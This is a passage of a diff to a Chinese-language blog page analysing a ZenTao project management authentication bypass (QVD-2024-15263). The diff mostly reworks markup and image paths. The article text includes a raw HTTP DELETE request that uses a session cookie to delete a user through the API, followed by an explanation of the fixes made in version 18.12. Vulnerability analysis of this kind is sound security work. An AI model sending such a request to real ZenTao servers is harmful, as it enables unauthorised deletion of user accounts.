-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DELETE /api.php/v1/users/37 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cookie: zentaosid=qyg;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<pre class="language-none"><code class="language-none">DELETE /api.php/v1/users/37 HTTP/1.1
+Host: 127.0.0.1
+Cookie: zentaosid=qyg;
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54
+X-Requested-With: XMLHttpRequest
+Connection: close
 
-<p><img src="/assets/attach-a267ad7be2e3fc26461f7ac92bf0c9298098ad83.png" alt="image.png"></p>
+</code></pre>
+
+<p><img src="/2024/05/24/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-QVD-2024-15263/attach-a267ad7be2e3fc26461f7ac92bf0c9298098ad83.png" alt="image.png"></p>
 <p>可以看到，用户已经被删除了</p>
-<p><img src="/assets/attach-d6b3d76b7aa3bda9c726fffa291f146c0ae8f80e.png" alt="image.png"></p>
+<p><img src="/2024/05/24/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-QVD-2024-15263/attach-d6b3d76b7aa3bda9c726fffa291f146c0ae8f80e.png" alt="image.png"></p>
 <h2 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h2><p>在禅道项目管理系统开源版18.12中对漏洞进行了修复。<br>先来看看空用户创建这个漏洞，来到module/common/model.php，如下：</p>
-<p><img src="/assets/attach-f79bcd804060e8174ef1c82b861ca04e445bed5d.png" alt="image.png"></p>
+<p><img src="/2024/05/24/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-QVD-2024-15263/attach-f79bcd804060e8174ef1c82b861ca04e445bed5d.png" alt="image.png"></p>
 <p>在if语句里加了<code>$this-&gt;loadModel('user')-&gt;isLogon()</code>来判断用户是否登录，若用户未登录，则返回false。</p>
 <p>再看一下越权漏洞，来到framework/api/entry.class.php，如下：</p>
-<p><img src="/assets/attach-8699c89fee652b16e4c999866f5b688fcbd82b33.png" alt="image.png"></p>
+<p><img src="/2024/05/24/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-QVD-2024-15263/attach-8699c89fee652b16e4c999866f5b688fcbd82b33.png" alt="image.png"></p>
 <p>当判断为未授权用户的时候，用<code>die()</code>函数终止了程序的运行。</p>
 <h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h2><ul>
 <li>return在接口用中来终止程序执行，使用不当可能会产生越权漏洞</li>
@@ -633,10 +662,11 @@
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
 
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
 
 <!-- 代码语言 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
 
 
 <!-- 代码块复制 -->
@@ -645,8 +675,6 @@
 
 
 <!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
 
 
@@ -832,7 +860,7 @@
             
         </div>
         <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/Luci4n555/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+    <a href="https://github.com/1uci4n" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
